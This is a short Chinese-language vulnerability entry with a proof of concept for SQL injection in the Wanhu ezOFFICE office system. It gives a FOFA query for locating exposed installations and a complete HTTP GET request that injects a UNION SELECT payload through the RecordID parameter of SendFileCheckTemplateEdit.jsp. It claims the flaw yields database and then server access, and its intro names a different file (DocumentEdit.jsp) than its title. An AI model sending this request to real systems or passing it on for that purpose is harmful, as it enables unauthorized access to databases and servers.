# 万户ezOFFICE系统接口SendFileCheckTemplateEdit.jsp存在SQL注入漏洞

万户OA DocumentEdit.jsp存在前台SQL注入漏洞，攻击者利用此漏洞获取数据库权限，深入利用可获取服务器权限。

## fofa

```javascript
app="万户网络-ezOFFICE"
```

## poc

```bat
GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1%27%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27admin%27)),NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
```

![图片.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409241012161.png)



## 漏洞来源

- https://forum.butian.net/article/600